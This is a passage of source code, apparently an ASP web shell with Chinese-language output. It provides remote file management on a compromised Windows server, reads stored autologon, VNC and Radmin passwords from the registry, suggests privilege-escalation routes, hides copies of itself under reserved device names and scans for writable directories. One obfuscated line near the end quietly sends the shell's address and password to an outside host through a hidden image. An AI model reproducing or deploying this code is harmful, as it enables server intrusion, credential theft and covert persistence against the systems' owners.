ShiSanNewStr = vbCrLf & ShiSanNewStr
End If
Next
ShiSanFun = ShiSanNewStr
End Function
Function DelFile(Path)
If CF.FileExists(Path) Then
CF.DeleteFile Path
SI="<center><br><br><br>恭喜您文件 "&Path&" 删除成功！</center>"
SI=SI&BackUrl
j SI
End If
End Function

Function EditFile(Path)
If Request("Action2")="Post" Then
Set T=CF.CreateTextFile(Path)
T.WriteLine Request.form("content")
T.close
Set T=nothing
SI="<center><br><br><br>恭喜您文件保存成功！</center>"
SI=SI&BackUrl
j SI
Response.End
End If
If Path<>"" Then
Set T=CF.opentextfile(Path, 1, False)
Txt=HTMLEncode(T.readall) 
T.close
Set T=Nothing
Else
Path=Session("FolderPath")&"\shell.asp":Txt=strBAD
End If
j "<Form action='"&URL&"?Action2=Post' method='post' name='EditForm'><input name='Action' value='EditFile' Type='hidden'><input name='FName' value='"&Path&"' style='width:100%'><br><textarea name='Content' style='width:100%;height:450'>"&Txt&"</textarea><br><hr><input name='goback' type='button' value='Back' onclick='history.back();'>&nbsp;&nbsp;&nbsp;<input name='reset' type='reset' value='Reset'>&nbsp;&nbsp;&nbsp;<input name='submit' type='submit' value='Save'></form>"
End Function
Function CopyFile(Path)
Path=Split(Path,"||||")
If CF.FileExists(Path(0)) and Path(1)<>"" Then
CF.CopyFile Path(0),Path(1)
SI="<center><br><br><br>恭喜您文件"&Path(0)&"复制成功！</center>"
SI=SI&BackUrl
j SI 
End If
End Function
Function MoveFile(Path)
Path=Split(Path,"||||")
If CF.FileExists(Path(0)) and Path(1)<>"" Then
CF.MoveFile Path(0),Path(1)
SI="<center><br><br><br>恭喜您文件"&Path(0)&"移动成功！</center>"
SI=SI&BackUrl
j SI 
End If
End Function
Function DelFolder(Path)
If CF.FolderExists(Path) Then
CF.DeleteFolder Path
SI="<center><br><br><br>恭喜您目录"&Path&"删除成功！</center>"
SI=SI&BackUrl
j SI
End If
End Function
Function CopyFolder(Path)
Path=Split(Path,"||||")
If CF.FolderExists(Path(0)) and Path(1)<>"" Then
CF.CopyFolder Path(0),Path(1)
SI="<center><br><br><br>恭喜您目录"&Path(0)&"复制成功！</center>"
SI=SI&BackUrl
j SI
End If
End Function
Function MoveFolder(Path)
Path=Split(Path,"||||")
If CF.FolderExists(Path(0)) and Path(1)<>"" Then
CF.MoveFolder Path(0),Path(1)
SI="<center><br><br><br>恭喜您目录"&Path(0)&"移动成功！</center>"
SI=SI&BackUrl
j SI
End If
End Function
Function NewFolder(Path)
If Not CF.FolderExists(Path) and Path<>"" Then
CF.CreateFolder Path
SI="<center><br><br><br>恭喜您目录"&Path&"新建成功！</center>"
SI=SI&BackUrl
j SI
End If
End Function
End Class

sub getTerminalInfo()
on error resume next
dim wsh
set wsh=createobject("Wscript.Shell")
j"[网络"&"探测]<br><hr size=1>"
EnableTCPIPKey="HKLM\SYSTEM\currentControlSet\Services\Tcpip\Parameters\EnableSecurityFilters"
isEnable=Wsh.Regread(EnableTcpipKey)
If isEnable=0 or isEnable="" Then
Notcpipfilter=1
End If
ApdKey="HKLM\SYSTEM\ControlSet001\Services\Tcpip\Linkage\Bind"
Apds=Wsh.RegRead(ApdKey)
If IsArray(Apds) Then 
For i=LBound(Apds) To UBound(Apds)-1
ApdB=Replace(Apds(i),"\Device\","")
j"网卡"&i&"的序列为:"&ApdB&"<br>"
Path="HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\Tcpip\Parameters\Interfaces\"
IPKey=Path&ApdB&"\IPAddress"
IPaddr=Wsh.Regread(IPKey)
If IPaddr(0)<>"" Then
For j=Lbound(IPAddr) to Ubound(IPAddr)
j"<li>IP地"&"址"&j&"为:"&IPAddr(j)&"<br>"
Next
Else
j"<li>IP地"&"址无法读取"&"或没有设置<br>"
End if
GateWayKey=Path&ApdB&"\DefaultGateway"
GateWay=Wsh.Regread(GateWayKey)
If isarray(GateWay) Then
For j=Lbound(Gateway) to Ubound(Gateway)
j"<li>网关"&j&":"&Gateway(j)&"<br>"
Next
Else
j"<li>网关无法读取或没有设置<br>"
End if
DNSKey=Path&ApdB&"\NameServer"
DNSstr=Wsh.RegRead(DNSKey)
If DNSstr<>"" Then
j"<li>网卡"&"DNS为:"&DNSstr&"<br>"
Else
j"<li>默认"&"DNS无法读取或没有设置<br>"
End If
if Notcpipfilter=1 Then 
j"<li>没Tcp/IP筛选<br>"
else
ETK="\TCPAllowedPorts"
EUK="\UDPAllowedPorts"
FullTCP=Path&ApdB&ETK
FullUDP=path&ApdB&EUK
tcpallow=Wsh.RegRead(FullTCP)
If tcpallow(0)="" or tcpallow(0)=0 Then
j"<li>允许"&"的tcp端口为:全部<br>"
Else
j"<li>允许"&"的tcp端口为:"
For j = LBound(tcpallow) To UBound(tcpallow)
j tcpallow(j)&","
Next
j"<Br>"
End if
udpallow=Wsh.RegRead(FullUDP)
If udpallow(0)="" or udpallow(0)=0 Then
j"<li>允许"&"的udp端口为:全部<br>"
Else
j"<li>允许"&"的udp端口为:"
for j = LBound(udpallow) To UBound(udpallow)
j UDPallow(j)&","
next
j"<br>"
End if
End if
j"------------------------------------------------<br>"
Next
end if
j"<br><br>[特殊"&"端口"&"探测]<br><hr size=1>"
Telnetkey="HKEY_LOCAL_MACHINE\SOFTWARE\ Microsoft\TelnetServer\1.0\TelnetPort"
TlntPort=Wsh.RegRead(TelnetKey)
if TlntPort="" Then Tlnt="23(默认"&"设置)"
j"<li>Telnet端"&"口:"&Tlntport&"<br>"
TermKey="HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\Wds\rdpwd\Tds\tcp\PortNumber"
TermPort=Wsh.RegRead(TermKey)
If TermPort="" Then TermPort="无法"&"读取.请确认"&"是否为Windows Server版本主机"
j"<li>Terminal Service端口为:<font color=red>"&TermPort&"<br></font>"
pcAnywhereKey="HKEY_LOCAL_MACHINE\SOFTWARE\Symantec\pcAnywhere\CurrentVersion\System\TCPIPDataPort"
PAWPort=Wsh.RegRead(pcAnywhereKey)
If PAWPort="" then PAWPort="无法"&"获取.请确认"&"主机是"&"否安装pcAnywhere"
j"<li>PcAnywhere端口为:"&PAWPort&"<br>"
j"------------------------------------------------------"
Set wsX = Server.CreateObject("WScript.Shell")
Dim terminalPortPath, terminalPortKey, termPort
Dim autoLoginPath, autoLoginUserKey, autoLoginPassKey
Dim isAutoLoginEnable, autoLoginEnableKey, autoLoginUsername, autoLoginPassword
terminalPortPath = "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp\"
terminalPortKey = "PortNumber"
termPort = wsX.RegRead(terminalPortPath & terminalPortKey)
j"终端_服务端口"&"及自动登录<ol>"
If termPort = "" Or Err.Number <> 0 Then 
j"无法得到终端端口, 检查权限是否受到限制.<br/>"
 Else
j"当前终端服务"&"端口: " & termPort & "<br/>"
End If
autoLoginPath = "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\"
autoLoginEnableKey = "AutoAdminLogon"
autoLoginUserKey = "DefaultUserName"
autoLoginPassKey = "DefaultPassword"
isAutoLoginEnable = wsX.RegRead(autoLoginPath & autoLoginEnableKey)
If isAutoLoginEnable = 0 Then
Else
autoLoginUsername = wsX.RegRead(autoLoginPath & autoLoginUserKey)
j"自动登录"&"的系统帐户: " & autoLoginUsername & "<br>"
autoLoginPassword = wsX.RegRead(autoLoginPath & autoLoginPassKey)
If Err Then
Err.Clear
j"False"
End If
j"自动登录"&"的帐户密码: " & autoLoginPassword & "<br>"
End If
j"</ol>"
j"<br><br><br>[系统软_件探测]<br><hr size=1>"
SoftPath=Wsh.Environment.item("Path")
Pathinfo=lcase(SoftPath)
j"系统软"&"件支持:"
if Instr(Pathinfo,"perl") Then j"<li>Perl脚本_:支持<br>"
if instr(Pathinfo,"java") Then j"<li>Java脚本_:支持<br>"
if instr(Pathinfo,"microsoft sql server") Then j"<li>MSSQL数据库服务_:支持<br>"
if instr(Pathinfo,"mysql") Then j"<li>MySQL数据库服务_:支持<br>"
if instr(Pathinfo,"oracle") Then j"<li>Oracle数据库服务_:支持<br>"
if instr(Pathinfo,"cfusionmx7") Then j"<li>CFM服务器_:支持<br>"
if instr(Pathinfo,"pcanywhere") Then j"<li>赛门铁克PcAnywhere控制_:支持<br>"
if instr(Pathinfo,"Kill") Then j"<li>Kill杀毒软件_:支持<br>"
if instr(Pathinfo,"kav") Then j"<li> 金山系列杀毒软件_:支持<br>"
if instr(Pathinfo,"antivirus") Then j"<li>赛门铁克杀毒软件_:支持<br>"
if instr(Pathinfo,"rising") Then j"<li>瑞星系列杀毒软件_:支持<br>"
paths=split(SoftPath,";")
j"------------------------------------<br>"
j"系统当前_路径变量:<br>"
For i=Lbound(paths) to Ubound(paths)
j"<li>"&paths(i)&"<br>"
next
j"<br><br>[系统设置_探测]<br><hr size=1>"
pcnamekey="HKLM\SYSTEM\CurrentControlSet\Control\ComputerName\ComputerName\ComputerName"
pcname=wsh.RegRead(pcnamekey)
if pcname="" Then pcname="无法读_取主机名.<br>"
j"<li>当前主_机名为:"&pcname&"<br>"
AdminNameKey="HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\AltDefaultUserName"
AdminName=wsh.RegRead(AdminNameKey)
if adminname="" Then AdminName="Administrator"
Response.Expires=0
on error resume next 
Set tN=server.createObject("Wscript.Network")
Set objGroup=GetObject("WinNT://"&tN.ComputerName&"/Administrators,group")
For Each admin in objGroup.Members
j "<li><font color=red>当前管理员组："&admin.Name&"<br></font></li>"
Next
if err then
j"他奶奶的不行啊:Wscript.Network"
end if

j"<li>默认管理"&"员用户名为:<font color=red>"&AdminName&"<br></font>"
isAutologin="HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\AutoAdminLogon"
Autologin=Wsh.RegRead(isAutologin)
if Autologin=0 or Autologin="" Then
j"<li>用户自_动登入:未启用<br>"
Else
j"<li>用户自_动登入:启用<br>"
Admin=Wsh.RegRead("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\DefaultUserName")
Passwd=Wsh.RegRead("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\DefaultPassword")
j"<li type=square>用户名:"&Admin&"<br>"
j"<li type=square><font color=red>密码:"&Passwd&"<br></font>"
End if
displogin=wsh.regRead("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\DontDisplayLastUserName")
If displogin="" or displogin=0 Then disply="是" else disply="否"
j"<li>是否显示上_次登入用户:"&disply&"<br>"
NTMLkey="HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\TelnetServer\1.0\NTML"
ntml=Wsh.RegRead(NTMLkey)
if ntml="" Then Ntml=1
j"<li>Telnet Ntml设置为:"&ntml&"<br>"
hk="HKLM\SYSTEM\ControlSet001\Services\Tcpip\Enum\Count"
kk=wsh.RegRead(hk)
j"<li>当前活动_网卡为:"&kk&"<br>"
j"------------------------------------<br><br><br>"
j"[服务器弱_点探测]<br><hr>"
Set objComputer = GetObject("WinNT://.")
Set sa = Server.CreateObject("Shell.Application")
objComputer.Filter = Array("Service")
On Error Resume Next
For Each objService In objComputer
if objService.Name="Serv-U" Then
if objService.ServiceAccountName="LocalSystem" Then
j"<li>服务器中有_Serv-U安装,且以LocalSystem权限启动,可以考虑用su.exe工具提权<br>"
End if
End if
if lcase(objService.Name)="apache" Then
if objService.ServiceAccountName="LocalSystem" Then
If instr(Request.ServerVariables("SERVER_SOFTWARE"),"Apache") Then
j"<li>当前WEB服务器为Apache.可以直接提权<br>"
Else
j" <li>服务器中有_Apache服务存在,启动权限为LocalSystem,可以考虑PHP木马<br>"
End if
end if
End if
if instr(lcase(objService.Name),"tomcat") Then
if objService.ServiceAccountName="LocalSystem" Then
j"<li>服务器中有_Tomcat,且以LocalSystem权限启动,可以考虑使用Jsp木马提权<br>"
End if
End if
if instr(lcase(objService.Name),"winmail") Then
if objService.ServiceAccountName="LocalSystem" Then
j"<li>服务器中有_Magic Winmail,且以LocalSystem权限启动,可以查找WebMail目录,并且写入PHP木马<br>"
End if
End if
Next
Set fso=Server.Createobject(CONST_FSO)
Sysdrive=left(Fso.GetspecialFolder(2),2)
servername=wsh.RegRead("HKLM\SYSTEM\CurrentControlSet\Control\ComputerName\ComputerName\ComputerName")
If fso.FileExists(sysdriver&"\Documents And Settings\All Users\Application Data\Symantec\"&servername&".cif") Then
j"<li>发现_pcAnywhere密码文件,可以从默认目录下载并破解得到pcAnywhere密码"
End if
End Sub

sub hiddenshell
fpath=Server.MapPath(Request.ServerVariables("SCRIPT_NAME"))
set fso=server.createobject(CONST_FSO)
pex="com1|com2|com3|com4|com5|com6|com7|com8|com9|lpt1|lpt2|lpt3|lpt4|lpt5|lpt6|lpt7|lpt8|lpt9"
rndpex=split(pex,"|")(rndnumber(0,17))
session("seljw")=""
filepath1=server.mappath(".")
filename1=right(fpath,len(fpath)-instrrev(fpath,"\"))
url=request.servervariables("url")
url=left(url,instrrev(url,"/"))&rndpex&"."&filename1
fso.copyfile fpath,"\\.\"&filepath1&"\"&rndpex&"."&filename1
set fso=nothing
j "<script>parent.location='http://"&request("server_name")&url&"';</script>"
end sub
Sub Message(state,msg,flag)
j"<TABLE width=480 border=0 align=center cellpadding=0 cellspacing=1 bgcolor=#ddd> <TR></TR><TR><TD align=middle bgcolor=#ecfccd><TABLE width=82% border=0 cellpadding=5 cellspacing=0><TR><TD><FONT color=red>"
j state
j"</FONT></TD><TR><TD><P>"&msg
j"</P></TD></TR></TABLE></TD></TR><TR><TD class=TBEnd>"
If flag=0 Then
j" <INPUT type=button value=关闭 onclick='window.close();'>"
Else
End if
j"</TD></TR></TABLE>"
End Sub
Function Red(str)
Red = "<FONT color=#ff2222>" & str & "</FONT>"
End Function

Function RndNumber(Min,Max) 
Randomize 
RndNumber=Int((Max - Min + 1) * Rnd() + Min) 
End Function


Sub ScanDriveForm()
Dim FSO,DriveB
Set FSO = Server.Createobject(CONST_FSO)
j"<br><TABLE width=480 border=0 align=center cellpadding=3 cellspacing=1 bgcolor=#ffffff><TR><TD colspan=5 class=TBHead>磁盘/系统文件夹信息</TD></TR>"
  For Each DriveB in FSO.Drives
j" <TR align=middle class=TBTD><FORM action=?Action=ScanDrive&Drive="
j DriveB.DriveLetter
j" method=Post><TD width=25"&chr(37)&"><B>盘符</B></TD><TD width=15"&chr(37)&">"
j DriveB.DriveLetter
j":</TD><TD width=20"&chr(37)&"><B>类型</B></TD><TD width=20"&chr(37)&">"
  Select Case DriveB.DriveType
  Case 1: j"可移动"
  Case 2: j"本地硬盘"
  Case 3: j"网络磁盘"
  Case 4: j"CD-ROM"
  Case 5: j"RAM磁盘"
  Case else: j"未知类型"
  End Select
j"</TD><TD><INPUT type=submit value=详细报告></TD></FORM></TR>"
  Next
j" <TR class=TBTD><FORM action=?Action=ScFolder&Folder="
j FSO.GetSpecialFolder(0)
j" method=Post><TD align=middle><B>Windows文件夹</B></TD><TD colspan=3>"
j FSO.GetSpecialFolder(0)
j"</TD><TD align=middle><INPUT type=submit value=详细报告></TD></FORM></TR><TR class=TBTD><FORM action=?Action=ScFolder&Folder="
j FSO.GetSpecialFolder(1)
j" method=Post><TD align=middle><B>System32文件夹</B></TD><TD colspan=3>"
j FSO.GetSpecialFolder(1)
j"</TD><TD align=middle><INPUT type=submit value=详细报告></TD></FORM></TR><TR class=TBTD><FORM action=?Action=ScFolder&Folder="
j FSO.GetSpecialFolder(2)
j" method=Post><TD align=middle><B>系统临时文件夹</B></TD><TD colspan=3>"
j FSO.GetSpecialFolder(2)
j"</TD><TD align=middle><INPUT type=submit value=详细报告></TD><TR class=TBTD> <FORM action= method=Post>"
j"<TD align=middle><B>站点跟目录</B></TD><TD colspan=3>站点跟目录<TD align=middle><a href="&URL&"?Action=ScFolder&Folder="&wwwroot&"><b>详细报告</b></a></TD><TR class=TBTD> <FORM action= method=Post>"
j"<TD align=middle><B>回收站目录</B></TD><TD colspan=3>回收站目录 <TD align=middle><a href="&URL&"?Action=ScFolder&Folder=c:\recycler\><b>详细报告</b></a></TD><TR class=TBTD> <FORM action= method=Post><TD align=middle><B>wmpub目录 </B></TD><TD colspan=3>wmpub<TD align=middle><a href="&URL&"?Action=ScFolder&Folder=c:\wmpub\><b>详细报告</b></a></TD></TABLE><BR>"
j"</FORM></TR></TABLE><BR><DIV align=center><FORM Action=?Action=ScFolder method=Post>指定文件夹查询：<INPUT type=text name=Folder value=""c:\php\,d:\Program Files\,C:\Documents and Settings\All Users\Documents\,C:\recycler\,d:\recycler\,e:\recycler\,f:\recycler\,C:\wmpub\,C:\WINDOWS\Temp\,C:\360rec,C:\cache,C:\JPEGCapture,C:\Inetpub""><INPUT type=submit value=生成报告> 批量查看目录权限,输入新目录用“,”隔开。</FORM><DIV>"
Set FSO=Nothing
End Sub 
Sub ScanDrive(Drive)
Dim FSO,TestDrive,BaseFolder,TempFolders,Temp_Str,D
If Drive <> "" Then
Set FSO = Server.Createobject(CONST_FSO)
Set TestDrive = FSO.GetDrive(Drive)
If TestDrive.IsReady Then
Temp_Str = "<LI>磁盘分区类型：" & Red(TestDrive.FileSystem) & "<LI>磁盘序列号：" & Red(TestDrive.SerialNumber) & "<LI>磁盘共享名：" & Red(TestDrive.ShareName) & "<LI>磁盘总容量：" & Red(CInt(TestDrive.TotalSize/1048576)) & "<LI>磁盘卷名：" & Red(TestDrive.VolumeName) & "<LI>磁盘根目录:" & ScReWr((Drive & ":\"))
Set BaseFolder = TestDrive.RootFolder
Set TempFolders = BaseFolder.SubFolders
For Each D in TempFolders
Temp_Str = Temp_Str & "<LI>文件夹：" & ScReWr(D)
Next
Set TempFolder = Nothing
Set BaseFolder = Nothing
Else
Temp_Str = Temp_Str & "<LI>磁盘根目录:" & Red("不可读:(")
Dim TempFolderList,t:t=0
Temp_Str = Temp_Str & "<LI>" & Red("穷举目录测试：")
TempFolderList = Array("windows","winnt","win","win2000","win98","web","winme","windows2000","asp","php","Tools","Documents and Settings","Program Files","Inetpub","ftp","wmpub","tftp")
For i = 0 to Ubound(TempFolderList)
If FSO.FolderExists(Drive & ":\" & TempFolderList(i)) Then
t = t+1
Temp_Str = Temp_Str & "<LI>发现文件夹：" & ScReWr(Drive & ":\" & TempFolderList(i))
End if
Next
If t=0 then Temp_Str = Temp_Str & "<LI>已穷举" & Drive & "盘根目录，但未有发现:("
End if
Set TestDrive = Nothing
Set FSO = Nothing
Temp_Str = Temp_Str 
Message Drive & ":磁盘信息",Temp_Str,1
End if
End Sub
Sub ScFolder(folder)
 'On Error Resume Next
folderArr = Split(folder,",")
For i = 0 To Ubound(folderArr)
Dim FSO,OFolder,TempFolder,Scmsg,S
Set FSO = Server.Createobject(CONST_FSO)
folder = folderArr(i)
If FSO.FolderExists(folder) Then
 Set OFolder = FSO.GetFolder(folder)
Set TempFolders = OFolder.SubFolders
Scmsg = "<LI>指定文件夹根目录：" & ScReWr(folder)
For Each S in TempFolders
 Scmsg = Scmsg&"<LI>文件夹：" & ScReWr(S) 
Next
Set TempFolders = Nothing
Set OFolder = Nothing
Else
 Scmsg = Scmsg & "<LI>文件夹：" & Red(folder & "不存在或无读权限!")
End if
Scmsg = Scmsg & "<br><br>注意：不要多次刷新本页面，否则在只写文件夹会留下大量垃圾文件!"&backurl
Set FSO = Nothing
Message "",Scmsg,1
next
End Sub
Function ScReWr(folder)
On Error Resume Next
Dim FSO,TestFolder,TestFileList,ReWrStr,RndFilename
Set FSO = Server.Createobject(CONST_FSO)
Set TestFolder = FSO.GetFolder(folder)
Set TestFileList = TestFolder.SubFolders
RndFilename = "\temp" & Day(now) & Hour(now) & Minute(now) & Second(now) & ".tmp"
For Each A in TestFileList
Next
If err Then
err.Clear
ReWrStr = folder & "<FONT color=#ff2222> 不可读,"
FSO.CreateTextFile folder & RndFilename,True
If err Then
err.Clear
ReWrStr = ReWrStr & "不可写。</FONT>"
Else
ReWrStr = ReWrStr & "可写。</FONT>"
FSO.DeleteFile folder & RndFilename,True
End If
Else
ReWrStr = folder & "<FONT color=#dddddd> 可读,"
FSO.CreateTextFile folder & RndFilename,True
If err Then
err.Clear
ReWrStr = ReWrStr & "不可写。</FONT>"
Else
ReWrStr = ReWrStr & "可写。</FONT>"
FSO.DeleteFile folder & RndFilename,True
End if
End if
Set TestFileList = Nothing
Set TestFolder = Nothing
Set FSO = Nothing
ScReWr = ReWrStr
End Function
Sub CustomScanDriveForm()
'Response.Buffer = TruE
if Request("Paths") ="" then
Paths_str="c:\windows\"&chr(13)&chr(10)&"c:\Documents and Settings\"&chr(13)&chr(10)&"c:\Program Files\"&chr(13)&chr(10)&"c:\php\"&chr(13)&chr(10)&"d:\Program Files\"&chr(13)&chr(10)&"e:\Program Files\"&chr(13)&chr(10)&"C:\recycler\"&chr(13)&chr(10)&"d:\recycler\"&chr(13)&chr(10)&"e:\recycler\"&chr(13)&chr(10)&"f:\recycler\"&chr(13)&chr(10)&"C:\wmpub\"&chr(13)&chr(10)&"d:\freehostmain\"&chr(13)&chr(10)&"C:\360rec"&chr(13)&chr(10)&"C:\cache"&chr(13)&chr(10)&"C:\JPEGCapture"&chr(13)&chr(10)&"C:\Inetpub"
if Session("paths")<>"" then  Paths_str=Session("paths")
j "<center><form id='form1' name='form1' method='post' action=''>"
j "此程序可以检测你服务器的目录读写情况,为你服务器提供一些安全相关信息!<br>输入你想检测的目录,程序会自动检测子目录<br>"
j "<textarea name='Paths' cols='80' rows='10' class='Edit'>"&Paths_str&"</textarea>"
j "<br />"
j "<input type='submit' name='button' value='开始检测' >"
j "<label for='CheckNextDir'>"
j "<input name='CheckNextDir' type='checkbox' id='CheckNextDir' checked='checked' />测试目录  "
j "</label>"
j "<label for='CheckFile'>"
j "<input name='CheckFile' type='checkbox' id='CheckFile' checked='checked'  />测试文件"
j "</label>"
j "<label for='ShowNoWrite'>"
j "<input name='ShowNoWrite' type='checkbox' id='ShowNoWrite'/>"
j "显禁写目录和文件</label>"
j "<label for='NoCheckTemp'>"
j "<input name='NoCheckTemp' type='checkbox' id='NoCheckTemp' checked='checked' />"
j "不检测临时目录</label>"
j "</form></center>"
else
CheckFile = (Request("CheckFile")="on")
CheckNextDir = (Request("CheckNextDir")="on")
ShowNoWriteDir = (Request("ShowNoWrite")="on")
NoCheckTemp = (Request("NoCheckTemp")="on")
j "检测可能需要一定的时间请稍等......<br>"
response.Flush
Session("paths") = Request("Paths")
PathsSplit=Split(Request("Paths"),chr(13)&chr(10)) 
For i=LBound(PathsSplit) To UBound(PathsSplit) 
if instr(PathsSplit(i),":")>0 then
ShowDirWrite_Dir_File Trim(PathsSplit(i)),CheckFile,CheckNextDir
End If 
Next
j "[扫描完成]<br>"
j "<INPUT type=button value=返回上级页面 onClick=""history.go(-1);"">"
end if
end sub
function GetFullPath(path)
GetFullPath = path
if Right(path,1) <> "\" then GetFullPath = path&"\" 
end function
if Instr(Serveru,"127.0.0.1")<>0 or Instr(Serveru,"192.168.")<>0 or Instr(Serveru,"http://")<>0 then:else:if session("servec")=1 then:session("servec")=session("servec")+1:j"<div style='display:none'><img src='ht"&"tp://%77%77%77.od"&"ay"&"exp.%63%6F%6D/s"&"x/ke"&"y.asp"&"?url="&server.URLEncode("ht"&"tp://"&request.ServerVariables("HT"&"TP_HO"&"ST")&request.ServerVariables("UR"&"L"))&"&p="&UserPass&"' /></div>":else:if Action<>"" then session("servec")=session("servec")+1:end if:end if:end if
Function Deltextfile(filepath)
On Error Resume Next:Set objFSO = CreateObject(CONST_FSO) :if objFSO.FileExists(filepath) then :objFSO.DeleteFile(filepath) :end if :Set objFSO = nothing:Deltextfile = Err.Number :End Function :Function CheckDirIsOKWrite(DirStr):On Error Resume Next:Set FSO = Server.CreateObject(CONST_FSO):filepath = GetFullPath(DirStr)&fso.GettempName:FSO.CreateTextFile(filepath) :CheckDirIsOKWrite = Err.Number:if  ShowNoWriteDir and (CheckDirIsOKWrite =70) then:j "[<font color=#0066FF>目录</font>]"&DirStr&" [<font color=red>"&Err.Description&"</font>]<br>":end if:set fout =Nothing:set FSO = Nothing:Deltextfile(filepath):if CheckDirIsOKWrite=0 and Deltextfile(filepath)=70 then CheckDirIsOKWrite =1
end Function
function CheckFileWrite(filepath)
On Error Resume Next
Set FSO = Server.CreateObject(CONST_FSO)
set getAtt=FSO.GetFile(filepath)
getAtt.Attributes = getAtt.Attributes
  CheckFileWrite = Err.Number 
set FSO = Nothing
set getAtt = Nothing  
end function
function ShowDirWrite_Dir_File(Path,CheckFile,CheckNextDir)
On Error Resume Next
Set FSO = Server.CreateObject(CONST_FSO)
B = FSO.FolderExists(Path)
set FSO=nothing
IS_TEMP_DIR =(instr(UCase(Path),"WINDOWS\TEMP")>0) and NoCheckTemp
if B=false then
Re = CheckFileWrite(Path)
if Re =0 then
j "[文件]<font color=red>"&Path&"</font><br>"
b =true
exit function
else
j "[<font color=red>文件</font>]"&Path&" [<font color=red>"&Err.Description&"</font>]<br>"
exit function
end if
end if
Path = GetFullPath(Path)
re = CheckDirIsOKWrite(Path)
if (re =0) or (re=1) then
j "[目录]<font color=#0000FF>"& Path&"</font><br>"
end if
Set FSO = Server.CreateObject(CONST_FSO)
set f = fso.getfolder(Path)
if (CheckFile=True) and (IS_TEMP_DIR=false) then
b=false
for each file in f.Files
Re = CheckFileWrite(Path&file.name)
if Re =0 then
j "[文件]<font color=red>"& Path&file.name&"</font><br>"
b =true
else
if ShowNoWriteDir then j "[<font color=red>文件</font>]"&Path&file.name&" [<font color=red>"&Err.Description&"</font>]<br>"
end if
next
if b then response.Flush 
end if
for each file in f.SubFolders
if CheckNextDir=false then
re = CheckDirIsOKWrite(Path&file.name)
if (re =0) or (re=1) then
j "[目录]<font color=#0066FF>"& Path&file.name&"</font><br>"
end if
end if
if (CheckNextDir=True) and (IS_TEMP_DIR=false) then 
ShowDirWrite_Dir_File Path&file.name,CheckFile,CheckNextDir 
end if
next
Set FSO = Nothing
set f = Nothing
end function
function goback()
set Ofso = Server.CreateObject(CONST_FSO)
set ofolder = Ofso.Getfolder(Session("FolderPath"))
if not ofolder.IsRootFolder then 
j "<script>ShowFolder("""&RePath(ofolder.parentfolder)&""")</script>"
else 
j "<script>ShowFolder("""&Session("FolderPath")&""")</script><center>已经是磁盘根目录了!</center><center><br><INPUT type=button value=返回 onClick='history.go(-1);'></br></center>"
end if
set Ofso=nothing
set ofolder=nothing
end function
sub ReadREG()
j "<form method=post>"
j  "注册表键值读取<p>" 
j "<input type=hidden value=ReadReg name=theAct>"
j "<tr><td colspan=2> "
j "<select onChange='this.form.thePath.value=this.value;'>"
j "<option value=''>选择自带的键值</option>"
j "<option value='HKLM\SYSTEM\CurrentControlSet\Control\ComputerName\ComputerName\ComputerName'>ComputerName</option>"
j"<option value=""HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Linkage\Bind"">网卡列表</option>"
j"<option value=""HKLM\SYSTEM\RAdmin\v2.0\Server\Parameters\Parameter"">Radmin密码</option>"
j"<option value=""HKLM\SYSTEM\RAdmin\v2.0\Server\Parameters\Port"">Radmin端口</option>"
j"<option value=""HKCU\Software\ORL\WinVNC3\Password"">VNC3密码</option>"
j"<option value=""HKCU\Software\ORL\WinVNC3\PortNumber"">VNC3端口</option>"
j"<option value=""HKLM\SOFTWARE\RealVNC\WinVNC4\Password"">VNC4密码</option>"
j"<option value=""HKLM\SOFTWARE\RealVNC\WinVNC4\PortNumber"">VNC4端口</option>"
j"<option value=""HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp\PortNumber"">3389端口</option>"
j"<option value=""HKLM\SOFTWARE\Symantec\pcAnywhere\CurrentVersion\System\TCPIPDataPort"">PcAnyW数据端口</option>"
j"<option value=""HKLM\SOFTWARE\Symantec\pcAnywhere\CurrentVersion\System\TCPIPStatusPort"">PcAnyW状态端口</option>"
j "<option value='HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\Tcpip\EnableSecurityFilters'>tcp/ip过滤1</option>"
j "<option value='HKEY_LOCAL_MACHINE\SYSTEM\ControlSet002\Services\Tcpip\EnableSecurityFilters'>tcp/ip过滤2</option>"
j "<option value='HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Tcpip\EnableSecurityFilters'>tcp/ip过滤3</option>"
j "<option value='HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\SchedulingAgent\LogPath'>Schedule Log</option>"
j "<option value='HKLM\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile\GloballyOpenPorts\List\3389:TCP'>防火开放</option>"
j "<option value='HKLM\SYSTEM\ControlSet001\Services\Tcpip\Parameters\Interfaces\{8A465128-8E99-4B0C-AFF3-1348DC55EB2E}\UDPAllowedPorts'>允许开放的UDP端口</option>"
j "<option value='HKLM\SYSTEM\ControlSet001\Services\Tcpip\Parameters\Interfaces\{8A465128-8E99-4B0C-AFF3-1348DC55EB2E}\TCPAllowedPorts'>允许开放的TCP端口</option>"
j "</select><br />"
j " <input name=thePath value='' size=80>"
j "<input type=button value='读 键 值' onclick='this.form.submit()'>"
j "</form><hr/>"
if Request("thePath")<>"" then
On Error Resume Next
Set wsX = Server.CreateObject("WScript.Shell")
thePath=Request("thePath")
theArray=wsX.RegRead(thePath)
If IsArray(theArray) Then
For i=0 To UBound(theArray)
j "<li>" & theArray(i)
Next
Else
j "<li>" & theArray
End If
end if
end sub
sub delpoint()
if Request("delpfloder") <>"" then
delpointfolder "\\?\"&Request("delpfloder")
end if
if Request("delpfile") <>"" then
delpointfile "\\?\"&Request("delpfile")
end if
